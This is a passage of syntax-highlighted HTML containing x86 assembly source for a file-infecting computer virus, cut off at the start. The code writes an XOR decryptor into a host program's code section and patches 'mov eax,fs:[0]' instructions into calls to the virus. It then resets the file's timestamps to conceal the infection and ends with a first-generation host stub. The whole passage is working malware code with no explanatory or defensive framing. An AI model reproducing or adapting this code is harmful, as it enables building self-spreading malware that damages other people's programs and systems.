    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">DecryptorSize</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">write_d</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0">
</span><span class="sc5">write_d</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">virus_entry_point</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">virus_entry_point</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapbase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">;save code section raw data</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">;esi - where to write virus decryptor</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VirusDecryptorStart</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">DecryptorSize</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc1">;esi - code section raw data</span><span class="sc0">
    </span><span class="sc1">;search for all mov eax,fs:[00000000] and replace it with nop --&gt; call virus_decryptor</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">;ecx - code section virtual size</span><span class="sc0">
</span><span class="sc5">@1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0a164h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">nxt_w</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">nxt_w</span><span class="sc0">
    </span><span class="sc1">;esi - mov eax,fs:[00000000] location.</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">90h</span><span class="sc0">  </span><span class="sc1">;nop</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1h</span><span class="sc4">],</span><span class="sc2">0e8h</span><span class="sc1">;call</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">virus_entry_point</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapbase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">6h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">nxt_w</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@1</span><span class="sc0">
</span><span class="sc5">CloseFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapbase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">UnmapViewOfFile</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">close_m</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hmap</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">close_f</span><span class="sc4">:</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ftLastWriteTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ftLastAccessTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ftCreationTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SetFileTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ExitInfect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">VirusDecryptorStart</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">pushfd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">00000000</span><span class="sc0">
    </span><span class="sc5">Virus_Start</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">
</span><span class="sc5">@dcrypt</span><span class="sc4">:</span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5h</span><span class="sc0">
    </span><span class="sc5">decrypt_key</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@dcrypt</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EndVirusDecryptor</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">DecryptorSize</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">EndVirusDecryptor</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VirusDecryptorStart</span><span class="sc4">)</span><span class="sc0">
    
    </span><span class="sc5">hfile</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">hmap</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">mapbase</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">virus_entry_point</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">EndVirus</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">First_Gen_Host</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc0">
    </span><span class="sc6">pushfd</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc0">
</span><span class="sc5">exit</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">First_Gen_Host</span><span class="sc0">

</span></div></body>
</html>
